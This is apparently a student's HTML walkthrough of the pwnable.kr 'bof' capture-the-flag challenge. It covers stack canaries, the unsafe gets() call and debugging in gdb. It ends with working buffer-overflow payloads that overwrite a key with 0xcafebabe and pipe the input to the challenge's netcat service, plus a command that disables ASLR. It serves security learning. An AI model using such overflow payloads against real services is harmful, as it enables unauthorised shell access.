@@ -1,0 +1,132 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>bof</title>
+</head><body>{Nana told me that buffer overflow is one of the most common software vulnerability. <br/>
+Is that true?<br/>
+<br/>
+Download : http://pwnable.kr/bin/bof<br/>
+Download : http://pwnable.kr/bin/bof.c<br/>
+<br/>
+Running at : nc pwnable.kr 9000}<br/>
+<br/>
+*** this is not just a solution but also a walkthrough of my way of solving including the errors and difficulties i faced<br/>
+<br/>
+<br/>
+downloading the files to work localy, we get an ELF 32bit and a C script<br/>
+<img src="image 2.png" /><br/>
+<br/>
+trying to overflow bof we get process termination.due to <b>GCC StackGuard</b><br/>
+<img src="image.png" /><br/>
+Termination occurs due to <b>GCC StackGuard</b>, the mechanism uses small value variables called "canaries" (after the canary birds taken into mines), these values are located on the stack after the end of the buffer and before the return address. when a buffer is overflowed, the cannries will be overwriten and their value will change, thus availing overflow detection.<br/>
+(see also <a href="https://www.redhat.com/en/blog/security-technologies-stack-smashing-protection-stackguard">redhat</a>, <a href="https://mcuoneclipse.com/2019/09/28/stack-canaries-with-gcc-checking-for-stack-overflow-at-runtime/">mcueclipce</a>&nbsp;and <a href="ftp://gcc.gnu.org/pub/gcc/summit/2003/Stackguard.pdf">gcc</a>).<br/>
+<br/>
+in order to "play" locally with a non protected file it is possible to compile without protection:<br/>
+<b>gcc -m32 &nbsp;-fno-stack-protector bof.c -o bofNoProtection<br/>
+</b>though this is for learning purpose, and it is not nescessary for the solution (we are not trying to change the IP).<br/>
+<b>-g </b>flag can be added for a verbose debugging mode (it changes the stack!).<br/>
+<br/>
+k, so lets look at the code:<br/>
+<img src="image 3.png" /><br/>
+<br/>
+in main we got a call to &nbsp;<b>func() </b>taking <b>0xdeadbeef</b>&nbsp;as the <b>key</b>&nbsp;parameter.<br/>
+in <b>func():</b><ul><li>we declare a 32 bytes buffer (line 5)</li>
+<li>we take user input via <b>gets()</b>&nbsp;and put into the buffer</li>
+<li>an <b>if statement</b>&nbsp;compares the <b>key</b>&nbsp;to <b>0xcafebabe</b></li>
+<li>if true, executes command to spawn a shell</li>
+</ul>
+<br/>
+*** <b>gets()</b>&nbsp;is unsafe and exploitable as it does not checks for the size of the user input and will overwrite memory if input is bigger than buffer size supplied (see also <a href="https://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1049157810&id=1043284351">Cprogramming</a>).<br/>
+*** <b>gets()</b>&nbsp;is terminated by newline (\n or \x0a), it will read untill (<b>but will not include)</b>&nbsp;the newline char<br/>
+*** if a shell is spawned before cannaries are checked, program termination will be suspended<br/>
+<br/>
+two main approaces:<ul><li><b>Overwrite the IP -</b>&nbsp;overwritten IP address can be redirected to address of the true part of the IF statement. to do so ASLR must be dissabled, this method is hard to implement as ASLR is active on the other side</li>
+<li><b>Overwrite the key parameter - </b>overflow the buffer until the <b>key</b>&nbsp;parameter is overwritten to <b>0xcafebabe</b>&nbsp;- easier to implement, no need to find exact address, as we know that the <b>key</b>&nbsp;parameter is located before the buffer on the stack, so we can overflow untill we get to it.</li>
+</ul>
+&nbsp;<br/>
+*** disabling ASLR, "0" to disable, "1" to enable, this is temporary and will reset after terminal restart <br/>
+<b>echo "0" &gt; /proc/sys/kernel/randomize_va_space<br/>
+<br/>
+</b>lets use <b>gdb</b>&nbsp;to further examine, setting breakpoint at main and running<br/>
+<img src="image 4.png" /><br/>
+<br/>
+disassembling <b>func</b>&nbsp;we can see the compare (<b>cmpl</b>), we'll set another breakpoint there to examine what happens after the user input is put to <b>gets()</b><br/>
+<img src="image 5.png" /><br/>
+*** notice address 0x56555683, the gcc canary check.<br/>
+<br/>
+after setting breakpoints, lets supply a 32 character long string and look at the memory around the SP.<br/>
+<b>(python3 -c 'print("A"*32)' &nbsp;===&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)<br/>
+</b><img src="image 6.png" /><br/>
+we see our 0xdeadbeef located lower on the stack (higher address), it is 20 bytes (4*5) away from the end of our buffer, giving total of 52 bytes to 0xdeadbeef.<br/>
+also highlighted are the return to main address and the canary, both are not of out interest if we manage to change <b>key</b>&nbsp;(see also <a href="https://visualgdb.com/gdbreference/commands/x">GDB x command</a>)<br/>
+<br/>
+now that we know where 0xdeadbeef is located, we may try to overwrite it:<br/>
+piping input inside gdb can be done (see also <a href="https://tldp.org/LDP/abs/html/x17837.html">here strings</a>)<br/>
+<b><span style="color: #ffffff"><span style="background-color: #3f3f3f">(gdb) r &lt;&lt;&lt;$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*52 + b"\xbe\xba\xfe\xca\x0a")')</span></span></b><br/>
+the use of python sys module is necessary in order to write a byte string<br/>
+<br/>
+looking around the SP again<br/>
+<img src="image 8.png" /><br/>
+stepping in to see whats happening<br/>
+<img src="image 9.png" /><br/>
+whats happening here is, we spawn a shell, but gdb can only follow 1 process at a time (Detaching...), so it leaves the shell aside and continues to run bof, which has its canary overwritten, so after checking we get a SIGABRT and the whole thing is aborted.<br/>
+<br/>
+now messing around a bit outside the gdb<br/>
+<img src="image 7.png" /><br/>
+process is terminated even though we know a shell has been spawned (notice we dont get a "<b>Nah ..</b>", meaning we're on the right path).<br/>
+<br/>
+*** for readability i've put the script into a payload file<br/>
+<b><br/>
+</b>notice that print is executed localy and the output is sent to be executed in the spawned shell.<br/>
+<img src="image 12.png" /><br/>
+in that manner, we can print the commands we want to execute:<br/>
+<img src="image 13.png" /><br/>
+<br/>
+now we may try it on netcat:<br/>
+<img src="image 14.png" /><br/>
+and see that its not working... we dont get back the output of the terminal.<br/>
+<br/>
+finally, to solve this problem, we will use "<b>cat</b>" command as the second command executed to create a continuous I/O stream between our machine and the server.<br/>
+<img src="image 15.png" /><br/>
+(further reading about pipe and cat - <a href="https://stackoverflow.com/questions/64562712/why-use-cat-to-open-interactive-shell">one,</a>&nbsp;<a href="https://security.stackexchange.com/questions/155844/using-cat-file-cat-to-run-a-simple-bof-exploit">two</a>)<br/>
+<br/>
+a different synthex that may work is:<br/>
+<img src="image 16.png" /><br/>
+<br/>
+a ctf can also be achieved with pwntools:<br/>
+<img src="image 17.png" /><br/>
+there's not much to say about the script, its mostly understandable.<br/>
+<b>p32()</b>&nbsp;function takes a hex address and outputs it in little endian format<br/>
+after executing the script we get a shell.<br/>
+<img src="image 18.png" /><br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+readelf -a <br/>
+<b><br/>
+- more assembly / understanding where deadbeef goes<br/>
+- python libraries - socket, parser<br/>
+- pwntools<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+string for the payload (52 A + cafebabe + newline)<br/>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xBE\xBA\xFE\xCA\x0A<br/>
+<br/>
+r &lt;&lt;&lt; $(python3 -c "import sys; sys.stdout.buffer.write(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xBE\xBA\xFE\xCA\x0A')")<br/>
+<br/>
+solutions:<ul><li>python3 -c 'import sys; sys.stdout.buffer.write(b"A"*52 + b"\xbe\xba\xfe\xca\x0a")' &gt; payload</li>
+<li>(cat payload &amp;&amp; cat) | nc pwnable.kr 9000</li>
+</ul>
+<ul><li>(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*52 + b"\xbe\xba\xfe\xca\x0a")'; cat) | nc pwnable.kr 9000</li>
+</ul>
+<br/>
+<br/>
+</b></body></html>
